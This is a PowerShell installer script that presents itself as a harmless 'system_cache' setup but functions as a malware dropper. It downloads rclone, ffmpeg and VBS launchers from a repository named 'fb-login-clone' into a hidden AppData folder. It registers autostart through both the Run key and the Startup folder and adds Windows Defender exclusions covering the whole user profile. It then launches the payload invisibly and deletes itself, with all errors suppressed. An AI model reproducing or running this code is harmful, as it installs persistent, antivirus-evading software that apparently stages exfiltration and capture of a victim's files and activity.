# setup.ps1

$ErrorActionPreference = "SilentlyContinue"

$dest = "$env:APPDATA\Microsoft\Windows\system_cache"
$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
$files = @(
    "system_cache.ps1",
    "system_cache_launcher.bat",
    "rclone.exe",
    "rclone.conf",
    "ffmpeg.exe",
    "setup.vbs",
    "system_cache_launcher.vbs"
)

# Create folder
if (-not (Test-Path $dest)) {
    try {
        New-Item -ItemType Directory -Path $dest -Force | Out-Null
    } catch {}
}

# Download files
foreach ($file in $files) {
    $target = Join-Path $dest $file
    if (-not (Test-Path $target)) {
        try {
            Invoke-WebRequest -Uri "$repo/$file" -OutFile $target -UseBasicParsing
        } catch {}
    }
}

# Register autostart
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "system_cache" -Value "$dest\system_cache_launcher.vbs"
} catch {}

# Add to Startup folder (duplicate autostart method)
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_cache.lnk"
    $shortcut = $WshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "$dest\system_cache_launcher.vbs"
    $shortcut.WorkingDirectory = $dest
    $shortcut.Save()
} catch {}

# Defender exclusions
try {
    Add-MpPreference -ExclusionPath $dest
    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
    Add-MpPreference -ExclusionProcess "$dest\system_cache_launcher.vbs"
    Add-MpPreference -ExclusionProcess "$dest\rclone.exe"
    Add-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
} catch {}

# Hide folder
try {
    if (Test-Path $dest) {
        $item = Get-Item -LiteralPath $dest
        $item.Attributes = $item.Attributes -bor 'Hidden'
    }
} catch {}

# Launch main script silently
try {
    Start-Process -WindowStyle Hidden -FilePath "$dest\system_cache_launcher.vbs"
} catch {}

# Self-delete
Start-Sleep -Seconds 2
$me = $MyInvocation.MyCommand.Path
try {
    Remove-Item $me -Force
} catch {}
